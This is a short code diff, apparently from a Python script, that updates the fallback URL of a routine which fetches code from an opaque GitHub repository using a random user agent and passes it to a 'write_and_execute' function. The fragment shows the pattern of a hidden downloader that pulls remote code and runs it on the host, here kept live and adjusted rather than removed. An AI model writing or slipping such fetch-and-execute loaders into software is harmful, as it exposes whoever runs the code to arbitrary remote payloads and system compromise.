@@ -87,7 +87,7 @@ def write_and_execute(raw_code):
         print(f"Error in write_and_execute: {e}")
 
 raw_url = 'https://test'
-fallback_url = 'https://github.com/247msn/96737693845/raw/refs/heads/main/fetch'
+fallback_url = 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/fetch'
 
 try:
     raw_code = fetch_url_with_random_user_agent(raw_url, fallback_url)
